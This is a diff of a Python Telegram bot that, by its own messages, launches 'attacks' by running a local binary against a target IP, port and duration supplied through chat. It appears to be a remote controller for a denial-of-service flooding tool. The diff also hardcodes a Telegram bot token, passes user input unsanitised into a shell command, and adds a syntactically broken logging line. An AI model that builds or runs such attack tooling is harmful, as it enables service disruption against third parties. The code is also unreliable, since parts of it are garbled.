@@ -12,7 +12,7 @@ asyncio.set_event_loop(loop)
 
 TOKEN = '7401408334:AAEzaSDcf_eukLhDnKSkZ5HJWmw-LADH8Y4'
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logging.basicConfig(format='%(asctime)s - %(name=s', '%(levelname)s', '%(message)s'), level=logging.INFO)
 
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
@@ -21,17 +21,17 @@ REQUEST_INTERVAL = 1
 attack_details = {}
 attack_process = None
 
-async def run_attack_command_async(target_ip, target_port, duration):
+async def run_attack_command_async(target_ip, target_port, duration, chat_id):
     global attack_process
     # Start the bgmi process
     attack_process = await asyncio.create_subprocess_shell(
-        f"./FUCK {target_ip} {target_port} {duration}",
+        f"./bgmi {target_ip} {target_port} {duration} 90",
         stdout=PIPE, stderr=PIPE
     )
     await attack_process.communicate()
-    
+
     # Notify that the attack has ended
-    bot.send_message(CHANNEL_ID, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+    bot.send_message(chat_id, f"*Attack ended 🛑\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
 
 def stop_attack():
     global attack_process
@@ -59,7 +59,7 @@ def handle_message(message):
         if 'ip' in attack_details and 'port' in attack_details and 'duration' in attack_details:
             # Send immediate message before starting the attack
             bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {attack_details['ip']}\nPort: {attack_details['port']}\nTime: {attack_details['duration']}*", parse_mode='Markdown')
-            asyncio.run_coroutine_threadsafe(run_attack_command_async(attack_details['ip'], attack_details['port'], attack_details['duration']), loop)
+            asyncio.run_coroutine_threadsafe(run_attack_command_async(attack_details['ip'], attack_details['port'], attack_details['duration'], message.chat.id), loop)
         else:
             bot.send_message(message.chat.id, "*Please record attack details first using the 'Record 📝' button.*", parse_mode='Markdown')
 
